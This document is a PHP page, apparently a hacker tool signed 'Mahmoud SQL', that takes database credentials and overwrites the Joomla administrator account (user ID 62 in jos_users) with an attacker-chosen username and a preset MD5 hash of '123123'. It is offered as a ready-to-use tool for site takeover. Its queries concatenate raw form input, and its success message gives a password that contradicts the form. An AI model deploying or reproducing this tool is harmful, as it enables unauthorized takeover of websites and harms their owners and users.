<?php
/*
Coded By Mahmoud SQL
*/
?>
<title>Team SQL # Mahmoud SQL</title>
<html>
<style>
input, select, text {
background-color: white;
border-style: white;
border-width: 1px;
font-family: verdana, arial, sans-serif;
font-size: 11px;
color: green;
padding: 0px;
</style>
<head>

<table id="table2" style="border-collapse: collapse;" bordercolordark="#666666" bordercolorlight="#c0c0c0" width="100%" 

bgcolor="black" border="1" cellpadding="5" cellspacing="0">

  <tbody>
  <tr>
    <td style="font-size: 11px; color: rgb(217, 217, 217); verdana, arial, sans-serif" valign="top" width="100%">
      <center><b>

		<font color="#008000"></style>
<head>

<meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />

</font>

<div align="center">
<center><p><font size="5" color="#008000">#...Change Password of Admin Joomla ...#</font><p>
<span lang="ar-jo"><font size="5" color="#008000">&#1587;&#1603;&#1585;&#1576;&#1578; &#1578;&#1594;&#1610;&#1585; &#1576;&#1575;&#1587;&#1608;&#1585;&#1583; &#1575;&#1604;&#1575;&#1583;&#1605;&#1606; 
&#1604;&#1587;&#1603;&#1585;&#1576;&#1578; &#1575;&#1604;&#1580;&#1605;&#1604;&#1577; </font></span></b>
<center><p>&nbsp;</center><b>

<font size="5" color="white">


</font></b></center></table>
</center>
<br></br>

<center>



</head>
    <body bgcolor="black" text="green">
       <div align="center">  
</div> 
      <?
if(empty($_POST['pwd'])){
echo "<FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" value=\"database\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" value=\"db_user\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" value=\"**\" name=\"password\" type=\"password\"><br>
      <br>
Set A New username 4 Login : <INPUT name=\"admin\" size=\"15\" value=\"admin\"><br>
Don`t Change it Password is : 123123: <INPUT name=\"pwd\" size=\"15\" value=\"4297f44b13955235245b2497399d7a93\"><br>

<INPUT value=\"change\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd       = $_POST['pwd'];
$admin     = $_POST['admin'];


         @mysql_connect($localhost,$username,$password) or die(mysql_error());
         @mysql_select_db($database) or die(mysql_error());

$hash = crypt($pwd);

$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 62") or die(mysql_error());

if($SQL){
echo "<b>root@secure:# ~ Success :now use a new user and password is : SQL   ## Good Luck Script Coded By Mahmoud SQL</b> ";
}

}

?>
<br></br>
<br></br>
<br></br>
<br>&nbsp;<p>Coded By Mahmoud SQL</p>